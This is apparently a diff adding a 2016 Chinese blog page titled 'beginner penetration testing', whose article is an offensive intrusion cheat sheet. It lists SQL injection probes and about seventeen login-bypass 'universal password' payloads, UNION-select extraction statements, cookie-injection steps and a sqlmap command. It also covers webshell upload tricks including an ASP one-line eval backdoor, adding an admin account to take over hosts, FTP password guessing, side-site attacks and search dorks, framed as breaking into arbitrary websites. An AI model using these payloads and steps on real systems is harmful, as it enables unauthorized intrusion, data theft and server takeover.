@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="chrome=1">
+
+    
+
+    <title>
+      初级渗透测试 | Hello,C 
+    </title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    
+    
+
+    <meta name="description" content="1、〓经典注入〓通常，判断一个网站是否存在注入点，可以用’，and 1=1 ,and 1=2,+and+1=1,+and+1=2,%20and%201=1,%20and%201=2,来判断，如果and 1=1正常返回页面，1=2错误，或者找不到，那么就存在注入点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初级渗透测试 | Hello,C">
+<meta property="og:url" content="http://yoursite.com/2016/08/05/初级渗透测试/index.html">
+<meta property="og:site_name" content="Hello,C">
+<meta property="og:description" content="1、〓经典注入〓通常，判断一个网站是否存在注入点，可以用’，and 1=1 ,and 1=2,+and+1=1,+and+1=2,%20and%201=1,%20and%201=2,来判断，如果and 1=1正常返回页面，1=2错误，或者找不到，那么就存在注入点">
+<meta property="og:updated_time" content="2016-08-05T09:07:54.412Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="初级渗透测试 | Hello,C">
+<meta name="twitter:description" content="1、〓经典注入〓通常，判断一个网站是否存在注入点，可以用’，and 1=1 ,and 1=2,+and+1=1,+and+1=2,%20and%201=1,%20and%201=2,来判断，如果and 1=1正常返回页面，1=2错误，或者找不到，那么就存在注入点">
+    
+    
+    
+      <link rel="icon" type="image/x-icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/uno.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/archive.css">
+    <link rel="stylesheet" href="/css/china-social-icon.css">
+
+</head>
+<body>
+
+    <span class="mobile btn-mobile-menu">
+        <i class="icon icon-list btn-mobile-menu__icon"></i>
+        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+    
+
+<header class="panel-cover panel-cover--collapsed">
+
+
+  <div class="panel-main">
+
+  
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+
+        
+
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">Hello,C</a></h1>
+        <hr class="panel-cover__divider" />
+
+        
+        <p class="panel-cover__description">
+          一个小白的独白！
+        </p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+
+        <div class="navigation-wrapper">
+
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+
+              
+                
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
+              
+                
+                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
+              
+                
+                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
+              
+                
+                <li class="navigation__item"><a href="/links" title="" class="">友情链接</a></li>
+              
+
+            </ul>
+          </nav>
+
+          <!-- ----------------------------
+To add a new social icon simply duplicate one of the list items from below
+and change the class in the <i> tag to match the desired social network
+and then add your link to the <a>. Here is a full list of social network
+classes that you can use:
+
+    icon-social-500px
+    icon-social-behance
+    icon-social-delicious
+    icon-social-designer-news
+    icon-social-deviant-art
+    icon-social-digg
+    icon-social-dribbble
+    icon-social-facebook
+    icon-social-flickr
+    icon-social-forrst
+    icon-social-foursquare
+    icon-social-github
+    icon-social-google-plus
+    icon-social-hi5
+    icon-social-instagram
+    icon-social-lastfm
+    icon-social-linkedin
+    icon-social-medium
+    icon-social-myspace
+    icon-social-path
+    icon-social-pinterest
+    icon-social-rdio
+    icon-social-reddit
+    icon-social-skype
+    icon-social-spotify
+    icon-social-stack-overflow
+    icon-social-steam
+    icon-social-stumbleupon
+    icon-social-treehouse
+    icon-social-tumblr
+    icon-social-twitter
+    icon-social-vimeo
+    icon-social-xbox
+    icon-social-yelp
+    icon-social-youtube
+    icon-social-zerply
+    icon-mail
+
+-------------------------------->
+
+<!-- add social info here -->
+
+
+
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/zjwfc?tab=activity" title="Huno on GitHub">
+          <i class='icon icon-social-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+
+    <!-- China social icon -->
+    
+    
+      <li class="navigation__item">
+        <a href="https://www.douban.com/" title="">
+          <i class='icon cs-icon-douban'></i>
+          <span class="label">douban</span>
+        </a>
+      </li>
+
+      <li class="navigation__item">
+        <a href="http://weibo.com/5664757301/profile?topnav=1&wvr=6&is_all=1" title="">
+          <i class='icon cs-icon-weibo'></i>
+          <span class="label">Weibo</span>
+        </a>
+      </li>
+
+ 
+
+
+
+  </ul>
+</nav>
+
+
+
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner entry">
+            
+
+<article class="post-container post-container--single">
+
+  <header class="post-header">
+    
+    <h1 class="post-title">初级渗透测试</h1>
+
+    
+
+    <div class="post-meta">
+      <time datetime="2016-08-05" class="post-meta__date date">2016-08-05</time> 
+
+      <span class="post-meta__tags tags">
+
+          
+
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/渗透测试/">渗透测试</a>
+            </font>
+          
+
+      </span>
+    </div>
+    
+    
+
+  </header>
+
+  <section id="post-content" class="article-content post">
+    <h2 id="1、〓经典注入〓"><a href="#1、〓经典注入〓" class="headerlink" title="1、〓经典注入〓"></a>1、〓经典注入〓</h2><pre><code>通常，判断一个网站是否存在注入点，可以用’，and 1=1 ,and 1=2,+and+1=1,+and+1=2,%20and%201=1,%20and%201=2,来判断，如果and 1=1正常返回页面，1=2错误，或者找不到，那么就存在注入点 
+</code></pre><a id="more"></a>
+<h2 id="2、〓万能密码OR漏洞〓"><a href="#2、〓万能密码OR漏洞〓" class="headerlink" title="2、〓万能密码OR漏洞〓"></a>2、〓万能密码OR漏洞〓</h2><pre><code>万能密码&apos;or&apos;=&apos;or&apos;,可以用在后台管理输入，有的网站由于没有过滤OR漏洞，输入OR直接就可以突破，一般漏洞存在于ASP类型的网站 
+</code></pre><p>###常见万能密码</p>
+<blockquote>
+<p>基本密码</p>
+</blockquote>
+<pre><code>admin     admin                admin     admin888
+</code></pre><blockquote>
+<p>asp aspx万能密码</p>
+</blockquote>
+<pre><code>1：&quot;or &quot;a&quot;=&quot;a                  2： &apos;)or(&apos;a&apos;=&apos;a
+3：or 1=1--                    4：&apos;or 1=1--
+5：a&apos;or&apos; 1=1--                 6：&quot;or 1=1--
+7：&apos;or&apos;a&apos;=&apos;a                   8：&quot;or&quot;=&quot;a&apos;=&apos;a
+9：&apos;or&apos;&apos;=&apos;                     10：&apos;or&apos;=&apos;or&apos;
+11: 1 or &apos;1&apos;=&apos;1&apos;=1             12: 1 or &apos;1&apos;=&apos;1&apos; or 1=1
+13: &apos;OR 1=1%00                 14: &quot;or 1=1%00
+15: &apos;xor
+16: 新型万能登陆密码
+   用户名 &apos; UNION Select 1,1,1 FROM admin Where &apos;&apos;=&apos; （替换表名admin）
+   密码 1 
+   Username=-1%cf&apos; union select 1,1,1 as password,1,1,1 %23
+   Password=1
+17..admin&apos; or &apos;a&apos;=&apos;a 密码随便
+</code></pre><blockquote>
+<p>PHP万能密码</p>
+</blockquote>
+<pre><code>&apos;or&apos;=&apos;or&apos;                         &apos;or 1=1/*  字符型 GPC是否开都可以使用
+ User: something
+ Pass: &apos; OR &apos;1&apos;=&apos;1
+</code></pre><blockquote>
+<p>jsp 万能密码</p>
+</blockquote>
+<pre><code>1&apos;or&apos;1&apos;=&apos;1                        admin&apos; OR 1=1/*
+用户名：admin    系统存在这个用户的时候 才用得上
+密码：1&apos;or&apos;1&apos;=&apos;1
+</code></pre><p> <strong>万能密码得于利用 全归功于以下的OR  和程序员所编写的程序</strong></p>
+<ul>
+<li><p>and逻辑运算的结果：真—-真===真；假—-真===假; 真—-假===假; 假—-假===假.</p>
+</li>
+<li><p>or逻辑运算的结果：真—-真===真；假—-真===真;   真—-假===真; 假—-假===假.</p>
+</li>
+</ul>
+<h2 id="3、〓爆库〓"><a href="#3、〓爆库〓" class="headerlink" title="3、〓爆库〓"></a>3、〓爆库〓</h2><pre><code>爆库，可以理解为爆出数据库下载，用爆库之类的工具可以直接就获得管理员用户和密码，%5C为十六进制的\符号，而数据库大于5.0就可以进行爆库，如在PHP手工高级注入时，用VERSION（）这个变量猜出网站数据库版本，如果一个网站数据库大于5.0，且是ACESS数据库，那么提交地址是：http://www.xxx.com/rpc/show24.asp?id=127,我们直接把%5C加到RPC后面，因为%5C是爆二级目录，所以应该是这样，http://www.xxx.com/rpc%5c/show24.asp?id=127,而%23是代表#，如果管理员为了防止他人非法下载数据库，而把数据库改成#database.mdb,这样防止了，如果页面地址为 http://www.xx.com/rpd/#database.mdb,是这样的，那么我们把%23加到替换#,http://www.xx.com/rpd/%23database.mdb 
+</code></pre><h2 id="4、〓COOKIE中转，SQL防注入程序，提醒你IP已被记录〓"><a href="#4、〓COOKIE中转，SQL防注入程序，提醒你IP已被记录〓" class="headerlink" title="4、〓COOKIE中转，SQL防注入程序，提醒你IP已被记录〓"></a>4、〓COOKIE中转，SQL防注入程序，提醒你IP已被记录〓</h2><pre><code>COOKIE中转，SQL防注入，如果检测一个网站时，弹出这样一个对话框，上面出现SQL防注入程序提醒的字语，那么我们可以利用COOKIE中转，注入中转来突破，方法是先搭建一个ASP环境（且网站为ASP网站），然后打开中转工具，记住一个网站的页面地址粘贴进工具里，值是多少就写多少，生成，把生成的文件放到目录里，接下来，打开网页，输入 http://127.0.0.1:(端口）/目录里文件，如果正常，那么输入 http://127.0.0.1:端口/值（目录文件）？提交值，那么拿到工具里猜表名，列名了
+</code></pre><h3 id="cookie注入可以使用cookie注入中转工具、手工和sqlmap三种方法"><a href="#cookie注入可以使用cookie注入中转工具、手工和sqlmap三种方法" class="headerlink" title="cookie注入可以使用cookie注入中转工具、手工和sqlmap三种方法"></a>cookie注入可以使用cookie注入中转工具、手工和sqlmap三种方法</h3><blockquote>
+<p>cookie 注入中转<br>  <a href="http://tiannanyi.blog.163.com/blog/static/187359344201352052954459/" target="_blank" rel="external">http://tiannanyi.blog.163.com/blog/static/187359344201352052954459/</a></p>
+</blockquote>
+<pre><code>例如目标网址为http://www.xxx.com/otype.asp?id=1，对于cookie注入中转生成器工具的使用，在注入url处和来源页填入http://www.xxx.com/otype.asp，而在注入键名输入id=，cookies处填入登录网页的cookies值，在post提交值改为1，选择生成asp即可。搭建一个ASP环境（且网站为ASP网站），把生成的asp文件放入搭建的目录，输入 http://127.0.0.1:(端口）/目录里文件即可访问，然后用啊D、明小子等即可注入
+</code></pre><blockquote>
+<p>cookie手工注入  <a href="http://www.2cto.com/Article/201202/118837.html" target="_blank" rel="external">http://www.2cto.com/Article/201202/118837.html</a></p>
+</blockquote>
+<pre><code>1.寻找形如“.asp?id=xx”类的带参数的URL。
+2.去掉“id=xx”查看页面显示是否正常，如果不正常，说明参数在数据传递中是直接起作用的。
+3.清空浏览器地址栏，输入“javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xx&quot;));”，按Enter键后弹出一个对话框，内容是“id=xx”，然后用原来的URL刷新页面，如果显示正常，说明应用是用Request(&quot;id&quot;)这种方式获取数据的。
+4.重复上面的步骤，将常规SQL注入中的判断语句带入上面的URL：“javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xx and 1=1&quot;));”“javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;xx and 1=2&quot;));”。和常规SQL注入一样，如果分别返回正常和不正常页面，则说明该应用存在注入漏洞，并可以进行cookie注入。
+5.使用常规注入语句进行注入即可。
+</code></pre><blockquote>
+<p>sqlamp注入  <a href="http://www.cnblogs.com/Apple010/p/4933545.html" target="_blank" rel="external">http://www.cnblogs.com/Apple010/p/4933545.html</a></p>
+</blockquote>
+<pre><code>如果目标网址为：http://www.xxx.com/otype.asp?id=1
+1、sqlmap.py -u &quot;http://www.xxx.com/otype.asp&quot; --cookie &quot;id=1&quot; --current-db --level 2
+</code></pre><p><strong>sqlmap的重要性大家想必也明白，对于它的学习其实也挺重要的</strong></p>
+<h2 id="5，-〓手工〓"><a href="#5，-〓手工〓" class="headerlink" title="5， 〓手工〓"></a>5， 〓手工〓</h2><blockquote>
+<p>ASP手工语句 </p>
+</blockquote>
+<pre><code>表名 and exists (select * from 表名) 
+列名 and (select count(列名) from 表名)&gt;0 
+长度 and (select top 1 len(username) from admin)&gt;0
+内容 and (select top 1 asc(mid(username,1,1)) from admin)&gt;100
+</code></pre><blockquote>
+<p>PHP手工语句</p>
+</blockquote>
+<pre><code>order by（猜字段）     and 1=2 union select （字段数）
+and 1=2 union selsect from(位置） 
+如果有30个字段，那么就应该在注入地址后输入 http://www.xxx.com/showfo.jsp?id=130 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28.29,30
+几个常用变量 ，USER(),VERSION()&lt;数据库版本），database()&lt;数据库名称&gt; 
+</code></pre><h2 id="6、〓抓包拿WEBSHELL〓"><a href="#6、〓抓包拿WEBSHELL〓" class="headerlink" title="6、〓抓包拿WEBSHELL〓"></a>6、〓抓包拿WEBSHELL〓</h2><pre><code>如果进入后台发现，点数据库备份的时候发现找不到，可以通过抓包来获得上传，拿到WEBSHELL，工具WOSCK抓包，一张图片，一个ASP马，自行搭建一个上传地址，UPLOAD加载，UPFILE上传，COOKIS=（ ） 
+</code></pre><h2 id="7、〓数据库备份拿WEBSHELL和一句话木马入侵〓"><a href="#7、〓数据库备份拿WEBSHELL和一句话木马入侵〓" class="headerlink" title="7、〓数据库备份拿WEBSHELL和一句话木马入侵〓"></a>7、〓数据库备份拿WEBSHELL和一句话木马入侵〓</h2><pre><code>通常进入后台了，发现有数据库备份，拿WEBSHELL吧，找一个添加产品的地方，传一个大马，格式为JPG图片，然后把图片地址粘贴到数据库备份那里，给起个名字，如SHELL.ASP,然后合地址访问的时候就进入webshell了，一句话木马入侵，先编辑记事本，加入一句话，改为2.jpg,然后备份，访问，发现500内部服务器错误，证明一句话成功，接下来用一句话木马客户端连接，得到路径页面，然后改下马名，输入大马内容，提交，得到WEBSHELL
+</code></pre><h2 id="8、〓DB权限差异备份拿WEBSHELL〓"><a href="#8、〓DB权限差异备份拿WEBSHELL〓" class="headerlink" title="8、〓DB权限差异备份拿WEBSHELL〓"></a>8、〓DB权限差异备份拿WEBSHELL〓</h2><pre><code>如果一个网站注入点是MYSQL数据库，且是DB权限，或者是SA权限，能够列目录，那么就好办了，找到网站的目录，目录通常在D和E盘，备份个小马，合地址访问看看成功没，直接备份大马貌似不行，成功后，再输入大马内容，拿到WEBSHELL
+</code></pre><h2 id="9、〓找后台〓"><a href="#9、〓找后台〓" class="headerlink" title="9、〓找后台〓"></a>9、〓找后台〓</h2><pre><code>找后台，一般默认为admin,admin/admin.asp,admin/login.asp,.admin_login.asp,manage/login.asp,login.asp,logon,user.asp,admin/index.asp,当然，这只是默认，一些大网站不可能还用admin作为后台，有的隐藏很深，可以简单用site:网站 inurl:后台来猜，或者下载源HTML文件分析找出后台，或者用各种工具（御剑、wvs等）来扫描了，方法很多的 
+</code></pre><h2 id="10、〓脚本提示〓"><a href="#10、〓脚本提示〓" class="headerlink" title="10、〓脚本提示〓"></a>10、〓脚本提示〓</h2><pre><code>有的网站要求进入后台会出现一个脚本提示，就像VB编程里INPUTBOX “”，一个对话输入框，我们输入administrator突破，admin代表以管理员身份来进入 
+</code></pre><h2 id="11、〓php后门和EWEBEDITOR编辑器入侵〓"><a href="#11、〓php后门和EWEBEDITOR编辑器入侵〓" class="headerlink" title="11、〓php后门和EWEBEDITOR编辑器入侵〓"></a>11、〓php后门和EWEBEDITOR编辑器入侵〓</h2><pre><code>PHP后门，如之前爆出的DISZ漏洞，在一个PHP网站后面加C.PHP,如果出现1，那么传个PHP马就拿到WEBSHELL，EWEBEDITOR编辑器入侵，是很快速的方式，设置好上传文件类型，传ASA，或者其他的格式，然后访问拿到WEBSHELL，如没有直接加语句拿到WEBSHELL
+</code></pre><h2 id="12、〓上传漏洞〓"><a href="#12、〓上传漏洞〓" class="headerlink" title="12、〓上传漏洞〓"></a>12、〓上传漏洞〓</h2><pre><code>有的网站虽然没有注入点，但存在一个上传漏洞，那么我们如何来利用了，首先，打开上传地址看是否存在，如果有，试想传一个ASP大马是不行的，那么传一句话看看，先看能成功不，用明小子来上传，动网，动力，动感，乔客4种方式，页面地址格式要对应，如果一个网站地址弹出对话框，显示上传成功，那么证明可以拿到WEBSHELL，传马，另外有的没有任何显示，直接空的，那么可以构建两个上传，第一个传JPG的图片，第二个传ASP马（大马），记住，大马后面要有个空格才行，如果一个网站地址出现文件类型不正确，请重新上传，那么证明%90可以拿到WEBSHELL，只是格式不对，不允许，改后缀，只要是网站没有过滤的格式，如果一个网站地址显示请登陆再上传，那么证明没有拿到COOKIS，思路是在该网站注册一个用户，得到COOKIS，然后上传就成功了 
+</code></pre><h2 id="13、〓简单提权拿下服务器和SERV提权和pcanywhere三方提权〓"><a href="#13、〓简单提权拿下服务器和SERV提权和pcanywhere三方提权〓" class="headerlink" title="13、〓简单提权拿下服务器和SERV提权和pcanywhere三方提权〓"></a>13、〓简单提权拿下服务器和SERV提权和pcanywhere三方提权〓</h2><pre><code>简单拿下服务器，也就是拿下网站IP主机，首先我们需要一个WEBSHELL，然后看看组件信息，看看路径可读可以写不，如果有一个可以，那么来到CMD命令下，首先输入可写的文件内容，执行命令加一个帐号和最高管理权限，然后输入netstat -an,得到主机连接端口，然后用3389连接进入，让其成为肉鸡（最好），这样比较隐蔽我们操作 
+</code></pre><h2 id="14、〓反查入侵和旁注和社会工程学〓"><a href="#14、〓反查入侵和旁注和社会工程学〓" class="headerlink" title="14、〓反查入侵和旁注和社会工程学〓"></a>14、〓反查入侵和旁注和社会工程学〓</h2><pre><code>反查IP入侵，也就是入侵21端口，首先我们入侵网站先PING WWW.XXX.COM ,出IP，然后到反查IP站点查挂了多少个域名，接下来，添加webmaster@地址，加入字典，（里面多收集可能的口令，如123，321，456），然后用流光探测密码，登陆 ftp://ip,输入用户和密码，改掉信息等等，社会工程学X-WAY，来得到FTP密码，也需要收集，并不是每个都行，总之是自己的经验 
+</code></pre><h2 id="15、〓跨站脚本攻击〓"><a href="#15、〓跨站脚本攻击〓" class="headerlink" title="15、〓跨站脚本攻击〓"></a>15、〓跨站脚本攻击〓</h2><pre><code>跨站（CSS），被动攻击，现在需要更多的思路和经验了 
+</code></pre><h2 id="16、〓特殊空格〓"><a href="#16、〓特殊空格〓" class="headerlink" title="16、〓特殊空格〓"></a>16、〓特殊空格〓</h2><pre><code>利用TAB制作的特殊空格，然后注册时输入空格，加管理名字，随便在网站上找个斑竹，或者管理的名字，这样来注册，有时自己注册的这个也会变成管理员 
+</code></pre><h2 id="17、〓c段-旁注〓"><a href="#17、〓c段-旁注〓" class="headerlink" title="17、〓c段  旁注〓"></a>17、〓c段  旁注〓</h2><pre><code>有时候我们渗透一个网站的时候发现没有什么漏洞，那么可以考虑考虑c段和旁注，有时候在我们没有思路的时候的时候这两个方面还是对我们有一些思路。
+</code></pre><blockquote>
+<p>c段</p>
+</blockquote>
+<pre><code>比如在：127.127.127.4 这个IP上面有一个网站 127.4 这个服务器上面有网站我们可以想想..他是一个非常大的站几乎没什么漏洞！但是在他同C段 127.127.127.1~127.127.127.255 这 1~255 上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透1~255任何一个站，之后提权来嗅探得到127.4这台服务器的密码，甚至3389连接的密码后台登录的密码，如果运气好会得到很多的密码…
+</code></pre><blockquote>
+<p>旁注</p>
+</blockquote>
+<pre><code>比如你要入侵A网站，但是在A网站上找不到漏洞！你可以选择和A网站同一服务器下的B网站，C网站寻找漏洞。上传漏洞也好，SQL注入也好，拿到webshell后提升权限，在服务器上找到A网站的目录
+</code></pre><p><strong>旁注的过程</strong> </p>
+<pre><code>1.利用工具或者网站WHOIS你所要攻击的目标资料，得到关于网站的域名注册信息以及主机是否是虚拟主机的确定，因为这样子才可以从旁注入。
+2.看服务器上面的所有网站程序，要理解熟悉每个程序的编写以及程序的功能（可以整天去源码站看源码，这样子你就会懂得如何去分别程序了） 
+3.利用现在所流行的所有漏洞来得到webshell 
+4.查看主机所开放的系统服务（这个办法是为了得到我们所要得到目标网站的路径）例如:Serv-u的用户配置文件（不是用来提升权限）IIS的用户配置文件（会泄漏大量用户路径的）杀毒软件的LOG（这个可是可遇不可求的） 
+5.在尽量不接触网站服务器的Admin权限下入侵（为了避免造成不必要的麻烦)） 
+6.建议使用两只以上的ASP木马
+</code></pre><h2 id="18、〓-GOOGLE-BACK语句〓（很多）"><a href="#18、〓-GOOGLE-BACK语句〓（很多）" class="headerlink" title="18、〓 GOOGLE BACK语句〓（很多）"></a>18、〓 GOOGLE BACK语句〓（很多）</h2><pre><code>利用谷歌hack可以搜索出我们想要的地址，达到事半功倍的效果
+inurl:asp?id= ,inurl:show.asp ,inurl:went.asp ,inurl:jsp?id=,inurl:php?id= 
+</code></pre><h2 id="19、非CMS获取Webshell方法："><a href="#19、非CMS获取Webshell方法：" class="headerlink" title="19、非CMS获取Webshell方法："></a>19、非CMS获取Webshell方法：</h2><pre><code>1、数据库备份获取webshell；
+2、抓包上传获取webshell；
+3、Sql命令获取webshell；
+4、模板修改获取webshell；
+5、插入一句话获取webshell；（注意必须和前面的语句闭合）  插入asp一句话：&quot;&gt;&lt;%eval pequest(&quot;pass&quot;)%&gt;&lt;%&apos;
+6、修改上传类型获取webshell；
+</code></pre>
+  </section>
+
+ 
+  
+
+<section class="post-comments">
+
+    <div class="ds-thread" data-thread-key="2016/08/05/初级渗透测试/"></div>
+
+    <script type="text/javascript">
+      var duoshuoQuery = {short_name:"zjwfc"};
+      (function() {
+        var ds = document.createElement('script');
+        ds.type = 'text/javascript';ds.async = true;
+        ds.src = '//static.duoshuo.com/embed.js';
+        ds.charset = 'UTF-8';
+        (document.getElementsByTagName('head')[0] 
+        || document.getElementsByTagName('body')[0]).appendChild(ds);
+      })();
+    </script> 
+
+</section>
+
+
+</article>
+
+
+
+
+            <footer class="footer">
+
+    <span class="footer__copyright">&copy; 2017-2018. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a></span>
+    
+</footer>
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<script type="text/javascript">
+		window.onload = function(){
+			var config = {
+				vx: 4,
+				vy:  4,
+				height: 2,
+				width: 2,
+				count: 100,
+				color: "121, 162, 185",
+				stroke: "100,200,180",
+				dist: 6000,
+				e_dist: 20000,
+				max_conn: 10
+			}
+			CanvasParticle(config);
+		}
+</script>
+<script type="text/javascript" src="js/canvas-particle.js"></script>
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+
+
+<span id="busuanzi_container_page_pv">
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+        </div>
+    </div>
+
+    <!-- js files -->
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/main.js"></script>
+    <script src="/js/scale.fix.js"></script>
+    
+
+    
+
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+            MathJax.Hub.Config({ 
+                tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+            });
+        });
+    </script>
+
+
+
+
+    
+
+    <script src="/js/awesome-toc.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $.awesome_toc({
+                overlay: true,
+                contentId: "post-content",
+            });
+        });
+    </script>
+
+
+    
+    
+    <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+
+</body>
+</html>
